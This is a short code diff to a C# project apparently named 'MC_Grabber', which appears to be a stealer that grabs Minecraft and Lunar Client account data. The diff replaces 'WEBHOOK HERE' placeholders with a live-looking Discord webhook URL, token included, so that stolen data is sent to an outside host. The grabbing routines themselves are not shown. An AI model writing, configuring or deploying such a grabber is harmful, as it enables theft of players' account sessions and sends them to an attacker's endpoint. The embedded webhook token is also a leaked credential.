@@ -10,8 +10,8 @@ namespace MC_Grabber
             Console.WriteLine("");
             Console.WriteLine("---> User Should Launch With Forge / Vanilla / ETC.");
             Grab grabber = new Grab();
-            grabber.Minecraft("SUPPORT ME BY STARRING THE REPO. // WEBHOOK HERE");
-            grabber.Lunar("WEBHOOK HERE");
+            grabber.Minecraft("SUPPORT ME BY STARRING THE REPO. // https://discordapp.com/api/webhooks/1009953235240493076/VjQs_MYOhRuQ7Ma1uqrpPPgXwzxsuRU_4cZzE7vHdUZZET26h94ERn8zWAeEZ5vxlMga");
+            grabber.Lunar("https://discordapp.com/api/webhooks/1009953235240493076/VjQs_MYOhRuQ7Ma1uqrpPPgXwzxsuRU_4cZzE7vHdUZZET26h94ERn8zWAeEZ5vxlMga");
         }
     }
 }
